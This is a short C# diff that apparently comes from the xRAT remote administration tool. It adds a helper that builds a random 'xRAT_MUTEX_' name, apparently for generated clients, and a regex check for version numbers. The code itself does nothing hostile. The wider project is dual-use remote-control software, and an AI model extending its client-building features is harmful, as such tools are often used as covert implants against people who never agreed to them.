@@ -26,5 +26,16 @@ namespace xServer.Core.Helper
                     return type.ToString();
             }
         }
+
+        public static string GenerateMutex(int length = 18)
+        {
+            return "xRAT_MUTEX_" + FileHelper.GetRandomFilename(length);
+        }
+
+        public static bool IsValidVersionNumber(string input)
+        {
+            Match match = Regex.Match(input, @"^[0-9]+\.[0-9]+\.(\*|[0-9]+)\.(\*|[0-9]+)$", RegexOptions.IgnoreCase);
+            return match.Success;
+        }
     }
 }
